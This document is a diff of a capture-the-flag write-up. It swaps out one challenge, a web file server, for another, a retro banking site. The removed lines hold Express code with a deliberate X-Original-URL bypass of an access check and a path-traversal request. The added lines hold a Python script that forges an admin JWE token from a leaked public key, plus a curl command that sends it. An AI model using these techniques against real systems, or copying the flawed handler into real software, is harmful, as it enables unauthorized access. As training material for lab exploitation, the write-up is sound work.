@@ -32,15 +32,20 @@ Navigating to the target revealed a retro banking interface with minimal functio
 
 * Static homepage with branding
 * Login page at /login.html
-* Profile page (post-authentication)
-* Admin section at /admin
 
 ![Challenge Homepage](https://0xuserm9.vercel.app/images/bankk/1.PNG)
 
 
 ## Step 2: Finding Test Credentials
 
-The homepage contained a link to `/resources/FNSB_InternetBanking_Guide.pdf`. Extracting text from this PDF revealed:
+Scrolling through the HTML source, I found a link buried in the footer:
+```
+<a href="/resources/FNSB_InternetBanking_Guide.pdf">
+  Access our Internet Banking guide here.
+</a>
+```
+
+Extracting text from this PDF revealed:
 
 
 ```
@@ -77,152 +82,107 @@ BASE64URL(protected_header).BASE64URL(encrypted_key).BASE64URL(iv).BASE64URL(cip
 
 ---
 
-## The Critical Discovery
+## Testing the Admin Area
+
+With the session cookie, I tried accessing `/admin`:
+
+**The response** was:
+```
+{"error":"Forbidden: admin subject required"}
+```
+
+This error tells us two things:
+
+1. The server uses the `sub` (subject) claim from the token to authorize access.
+
+2. If we can forge a token with `"sub":"admin"`, we can bypass the restriction.
+
+## Token Analysis:
+
+``
+{
+  "cty": "JWT",
+  "enc": "A256GCM",
+  "alg": "RSA-OAEP-256"
+}
+``
+This is not a standard JWT (which is usually signed). It’s a **JWE (JSON Web Encryption) token**. JWE is used to encrypt the payload, not to sign it.
+
+* `alg`: RSA-OAEP-256 – the key encryption algorithm. The server encrypts a random Content Encryption Key (CEK) with its RSA public key.
+
+* `enc`: A256GCM – the content encryption algorithm. The payload is encrypted with AES-256-GCM using the CEK.
+
+The crucial point: **RSA-OAEP** is an **asymmetric encryption scheme**. Anyone possessing the **public key can encrypt data** that only the holder of the private key can decrypt.
 
 ## Directory Listing Exposure
 
-
-```js
-const express = require("express");
-const fs = require("fs");
-const path = require("path");
-
-const app = express();
-app.use(express.text({ type: "*/*" }));
-
-// Base folder where you ALREADY created the files manually
-const BASE = path.join(__dirname, "data");
-
-// These folders MUST already exist
-const PUBLIC_DIR = path.join(BASE, "public");
-const PRIVATE_DIR = path.join(BASE, "vault"); // renamed to be less obvious
-
-// Main handler
-app.all("*", (req, res) => {
-
-    const override = req.header("X-HTTP-Method-Override");
-    const method = override ? override.toUpperCase() : req.method.toUpperCase();
-
-    const depth = req.header("Depth") || "0";
-    const urlPath = req.path === "/" ? "" : req.path;
-    const target = path.join(BASE, urlPath);
-
-    // ...
-
-    // ==========================
-    // BLOCK direct PROPFIND
-    // ==========================
-    if (req.method.toUpperCase() === "PROPFIND") {
-        return res.status(405).send("method not allowed , yaaaaa9999iiiiiiiiiiwwwwwwwww.");
-    }
-
-    // ==========================
-    //            GET
-    // ==========================
-    if (method === "GET") {
-        const overrideUrl = req.header("X-Original-URL");
-
-        if (overrideUrl) {
-            const realTarget = path.join(BASE, overrideUrl);
-            if (fs.existsSync(realTarget) && fs.lstatSync(realTarget).isFile()) {
-                return res.send(fs.readFileSync(realTarget, "utf8"));
-            }
-            return res.status(404).send("Not found");
-        }
-
-        if (urlPath === "" || urlPath === "/") {
-            const indexFile = path.join(PUBLIC_DIR, "index.html");
-            if (fs.existsSync(indexFile)) return res.send(fs.readFileSync(indexFile, "utf8"));
-            return res.status(404).send("Missing index.html");
-        }
-
-        if (!fs.existsSync(target)) return res.status(404).send("Not found");
-        if (target.startsWith(PRIVATE_DIR)) return res.status(403).send("Forbidden");
-        if (fs.lstatSync(target).isDirectory()) return res.status(400).send("Cannot GET directory");
-
-        // ...
-});
+While enumerating directories, I discovered that `/resources/` had directory listing enabled:
+```
+Index of /resources/
+[ ] FNSB_InternetBanking_Guide.pdf    2026-03-14 14:23  2.4M
+[ ] key.pem                            2026-03-14 14:23  1.7K
+[ ] memo.txt                           2026-03-14 14:23  0.1K
 ```
 
-Important code found:
+## The Fatal Leak: key.pem
 
-```js
-const BASE = path.join(__dirname, "data");
-const PUBLIC_DIR = path.join(BASE, "public");
-const PRIVATE_DIR = path.join(BASE, "vault"); 
+Downloading and examining `/resources/key.pem` revealed:
 ```
-
-Directory structure:
-
-```
-/app/data/public
-/app/data/vault 
+-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsio2dcXheqKLrteRx4V1
+7FchW6AE2zszlMyiN8S7D16ww1a9AFC8EQhEHNW1PLXncXiimNeb6/oZP2+V18gE
+ZoyKIET2oHC4MmthSOFrW0nFgfgRJdH7VyEVHupFL6tFAJvHFWVplTgCdqtegihG
+cG7XKUGah4Q8FytlIhk/A983LtbblhAnfKTeBwxT2wVZE9+5pWhPmdGLoX3Hf0Uy
+pHJTkL6D7C4X4KGJiNrSJ6mJw4sDpXlZEvagB0uFaO4b22WX6HSf2ZOBW5VHEWS5
+TiKvliyTQL3FJWXefqxHgQL8diDWhWwYXI7Q0b+otJ5/G/jMGL2S+N10oJTitTuK
+OQIDAQAB
+-----END PUBLIC KEY-----
 ```
 ---
 
-## Step 5 — My Initial Access Attempt
+## Crafting the Forged JWE Token:
 
-### First Try: Direct Access to Private Directory
-Based on this structure, my first attempt was logical:
+Python script to encrypt a malicious payload using the server's own public key:
 
-- I knew from the code that:
-  - BASE = "`/app/data`"
-  - PRIVATE_DIR = "`/app/data/vault`"
-- So `flag.txt` should be at the private directory: `/app/data/vault/flag.txt`
-- Since I had LFI, I tried: 
-```http
-GET /../../../app/data/vault/flag.txt
+```
+from joserfc import jwe
+from joserfc.jwk import RSAKey
+from joserfc.jwe import JWERegistry
+import json
+
+# Load the exposed public key
+with open("key.pem", "rb") as f:
+    key = RSAKey.import_key(f.read())
+
+registry = JWERegistry(algorithms=["RSA-OAEP-256", "A256GCM"])
+
+# Match the exact header structure of real tokens
+protected = {"cty": "JWT", "alg": "RSA-OAEP-256", "enc": "A256GCM"}
+
+# Forge an admin payload
+payload = {"sub": "admin"}
+plaintext = json.dumps(payload, separators=(',', ':')).encode()
+
+token = jwe.encrypt_compact(protected, plaintext, key, registry=registry)
+print(token)
 ```
 
-![Challenge Homepage](https://0xuserm9.vercel.app/images/nex/3.PNG)
+### Use the Forged Token:
 
-### Understanding Why 403 Happened:
-Looking at the code, the normal request flow has this check (LINE 55):
-```js
-if (target.startsWith(PRIVATE_DIR)) return res.status(403).send("Forbidden");
 ```
-When I made my request:
-1. target = `/app/data/vault/flag.txt` (after path.join)
-2. PRIVATE_DIR = `/app/data/vault`
-3. target.startsWith(PRIVATE_DIR) = true 
-4. Result: `403 Forbidden` 
-
-> The security check was working!
-
----
-
-## Step 6 — Finding the Bypass & Retrieve the Flag:
-
-**While analyzing the code, I discovered a second way to access files:**
-```js
-if (method === "GET") {
-    const overrideUrl = req.header("X-Original-URL");
-
-    if (overrideUrl) {
-        const realTarget = path.join(BASE, overrideUrl);
-        if (fs.existsSync(realTarget) && fs.lstatSync(realTarget).isFile()) {
-            return res.send(fs.readFileSync(realTarget, "utf8"));
-        }
-        return res.status(404).send("Not found");
-    }
-    // ... rest of normal flow with security checks
-}
+curl -s -H "Cookie: fnsb_token=$TOKEN" http://challenge.utctf.live:5926/admin
 ```
-**Key Insight:**
-- The X-Original-URL header creates a different file access path:
-- Uses `path.join(BASE, overrideUrl)` instead of normal path resolution
-- Missing the `startsWith(PRIVATE_DIR)` check!
-- Allows bypassing the `403 restriction`
-
-### The Successful Exploit:
-I could use the header to access it:
-
-![Challenge Homepage](https://0xuserm9.vercel.app/images/nex/challenge.PNG)
-
-**THE FLOW:**
-![Challenge Homepage](https://0xuserm9.vercel.app/images/nex/deepseek_mermaid_20251215_0c7db3.png)
-
-**The Flag: `nexus{w3bd4v_wchw3y4_h3d34rs_eezzzzzzzzz}`**
-
+The response contains the `admin` console and the **flag**:
+``
+<!DOCTYPE html>
+<html>
+<head><title>FNSB SysAdmin Console</title></head>
+<body>
+    <h1>Welcome, Administrator</h1>
+    <div class="flag">utflag{s0m3_c00k1es_@re_t@st13r_th@n_0th3rs}</div>
+    ...
+</body>
+</html>
+```
 ---
 Happy Hacking 🏴‍☠️
